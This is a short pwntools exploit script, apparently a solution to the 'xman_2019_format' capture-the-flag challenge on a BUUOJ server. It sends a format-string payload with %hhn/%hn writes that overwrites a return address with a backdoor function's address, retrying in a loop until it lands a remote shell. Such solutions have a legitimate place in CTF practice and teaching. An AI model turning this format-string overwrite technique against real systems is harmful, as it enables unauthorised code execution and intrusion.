from pwn import *


def pwn(p):
    back_door = 0x080485AB 
    offset_1 = 10
    offset_2 =18
    
    # guess the last byte in the ret addr is 0x5c
    pad = "%{}c%{}$hhn".format(0x5c, offset_1).encode("ISO-8859-1")+b"|"
    pad += "%{}c%{}$hn".format(back_door & 0xffff, offset_2).encode("ISO-8859-1")
    p.send(pad)

# burst
def run():
    while True:
        try:
            p = remote("node4.buuoj.cn", 26769)
            # p = process("./xman_2019_format")
            pwn(p)
            p.sendline("ls")
            p.recvuntil("flag", timeout=1)
            p.interactive()
            break
        except Exception as e:
            print(e)
            p.close()

run()

